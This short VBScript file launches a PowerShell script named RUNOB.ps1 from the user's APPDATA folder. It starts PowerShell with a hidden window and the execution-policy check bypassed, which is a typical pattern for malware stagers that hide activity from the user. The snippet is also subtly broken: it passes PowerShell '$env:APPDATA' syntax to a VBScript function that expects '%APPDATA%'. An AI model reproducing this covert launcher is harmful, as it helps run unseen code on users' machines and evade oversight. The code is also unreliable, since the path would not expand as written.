Set objShell = CreateObject("WScript.Shell")

' Specify the path to your PowerShell script
psScriptPath = objShell.ExpandEnvironmentStrings("$env:APPDATA\RUNOB.ps1")

' Build the command to run the PowerShell script silently
cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " & psScriptPath

' Execute the command with a hidden window
objShell.Run cmd, 0, True
